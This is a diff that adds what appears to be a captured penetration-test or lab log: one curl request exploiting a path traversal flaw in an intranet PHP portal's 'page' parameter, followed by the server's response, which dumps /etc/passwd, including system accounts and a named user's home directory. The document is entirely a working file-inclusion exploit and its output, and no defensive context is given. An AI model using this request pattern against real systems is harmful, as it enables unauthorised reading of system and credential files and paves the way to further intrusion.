@@ -1,0 +1,22 @@
+$ curl -s -i 'http://intranet.megacorp.local/index.php?page=../../../../../../etc/passwd'
+HTTP/1.1 200 OK
+Date: Wed, 17 Sep 2026 13:14:52 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+Connection: close
+
+<html>
+<head><title>Intranet Portal</title></head>
+<body>
+<div id="content">
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+tomcat:x:997:997::/opt/tomcat:/bin/false
+j.mercer:x:1000:1000:Jack Mercer,,,:/home/j.mercer:/bin/bash
+</div>
+</body>
+</html>
